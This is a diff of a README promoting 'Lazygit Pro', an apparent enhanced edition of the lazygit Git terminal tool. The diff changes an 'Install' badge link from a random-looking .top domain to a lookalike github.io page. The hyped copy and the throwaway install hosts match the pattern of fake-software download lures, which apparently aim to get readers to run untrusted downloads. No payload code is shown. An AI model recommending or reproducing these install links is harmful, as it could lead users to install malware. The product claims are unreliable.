@@ -2,7 +2,7 @@
 
 Lazygit Pro revolutionizes Git workflow by providing an advanced yet intuitive terminal interface that combines power with simplicity. Designed for both novice developers and Git veterans, this tool transforms complex version control tasks into visual, interactive operations. With real-time feedback and intelligent automation, Lazygit Pro eliminates the steep learning curve of traditional Git CLI while preserving all its powerful capabilities. Experience Git like never before - where every commit, branch, and merge becomes intuitive and effortless.
 
-[![Install Lazygit Pro](https://img.shields.io/badge/GET-Lazygit_Pro-9cf)](https://poelkakusthbutn.top/)
+[![Install Lazygit Pro](https://img.shields.io/badge/GET-Lazygit_Pro-9cf)](https://lazygit-terminal-ui-for-git-commands.github.io/.github)
 
 ---
 
